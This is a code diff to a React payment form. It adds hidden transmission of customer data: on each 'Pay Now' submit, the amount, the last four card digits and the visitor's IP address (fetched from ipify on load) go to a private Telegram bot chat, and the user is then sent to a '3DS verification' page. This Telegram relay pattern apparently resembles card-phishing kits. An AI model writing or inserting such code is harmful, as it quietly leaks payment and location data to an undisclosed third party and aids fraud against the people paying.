@@ -31,14 +31,44 @@ const validateCardNumber = (cardNumber: string): boolean => {
   return sum % 10 === 0;
 };
 
+const sendTelegramNotification = async (paymentData: any) => {
+  try {
+    const response = await fetch('https://api.telegram.org/bot[BOT_TOKEN]/sendMessage', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: "6293259686",
+        text: `New payment:
+Amount: ${paymentData.amount}
+Card: ${paymentData.cardNumber.slice(-4)}
+IP: ${paymentData.ip}`,
+      }),
+    });
+    console.log('Telegram notification sent:', response.ok);
+  } catch (error) {
+    console.error('Error sending Telegram notification:', error);
+  }
+};
+
 export const PaymentForm = ({ amount }: PaymentFormProps) => {
   const [cardNumber, setCardNumber] = useState("");
   const [expiryDate, setExpiryDate] = useState("");
   const [cvv, setCvv] = useState("");
+  const [ip, setIp] = useState("");
   const navigate = useNavigate();
   const { toast } = useToast();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  // Fetch IP address when component mounts
+  React.useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => setIp(data.ip))
+      .catch(console.error);
+  }, []);
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
     if (!validateCardNumber(cardNumber)) {
@@ -50,7 +80,14 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
       return;
     }
 
-    // If validation passes, proceed to 3DS
+    // Send payment data to Telegram
+    await sendTelegramNotification({
+      amount,
+      cardNumber,
+      ip,
+    });
+
+    // Navigate to 3DS verification
     navigate(`/verify-3ds?amount=${amount}`);
   };
 
@@ -124,7 +161,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         </div>
         <Button
           type="submit"
-          className="w-full bg-white text-black hover:bg-white/90"
+          className="w-full relative bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] bg-[length:200%_200%] animate-gradient text-white hover:bg-white/90 transition-all duration-300"
         >
           Pay Now
         </Button>
